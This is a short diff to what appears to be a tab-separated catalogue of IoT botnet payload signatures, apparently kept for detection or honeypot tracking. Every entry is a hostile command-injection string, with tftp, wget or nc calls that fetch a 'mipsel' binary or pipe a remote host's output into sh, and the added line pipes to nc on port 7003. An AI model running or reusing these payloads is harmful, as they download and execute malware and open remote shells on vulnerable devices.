@@ -31,3 +31,4 @@ tftp-generic	9034	cd /tmp; tftp -g -r mipsel 198.51.100.11; chmod 777 mipsel; ./
 tftp-busybox	9034	/bin/busybox tftp -r mipsel -g 198.51.100.11; chmod 777 mipsel
 geico-ppppl3-wire	43562	'&nc 160.119.71.134 5959|sh&'ppppl3
 geico-easydisc-wire2	43562	'&wget http://g6.wtf/ge -O-|sh&'al3
+geico-ppppppl3-nc-9	0	|nc 160.119.71.9 7003 2>/dev/null > a$$
